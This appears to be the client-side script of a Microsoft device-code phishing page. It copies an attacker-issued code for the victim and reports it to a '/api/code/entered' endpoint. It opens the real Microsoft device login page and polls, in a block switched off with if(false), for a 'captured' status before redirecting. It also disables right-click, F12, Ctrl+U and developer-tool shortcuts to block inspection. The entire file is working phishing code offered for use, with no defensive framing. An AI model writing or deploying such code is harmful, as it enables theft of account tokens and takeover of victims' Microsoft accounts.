
const C = document.getElementById('code').textContent;
const D = 4024;
function copyCode() {
  navigator.clipboard.writeText(C);
  fetch('/api/code/entered', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:C})});
}
function openDeviceLogin() { window.open('https://microsoft.com/devicelogin', '_blank'); }
if (false) {
  setInterval(async () => {
    const r = await fetch('/api/code/status/' + D);
    const result = await r.json();
    if (result.status === 'captured' && result.redirect) window.location.href = result.redirect;
  }, 5000);
}
document.addEventListener('contextmenu',
  function(e){ e.preventDefault() });

document.addEventListener('keydown', function(e){
  if(
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey &&
      ['I','J','C'].indexOf(e.key) > -1) ||
    (e.ctrlKey && e.key === 'u')
  ) e.preventDefault()
});
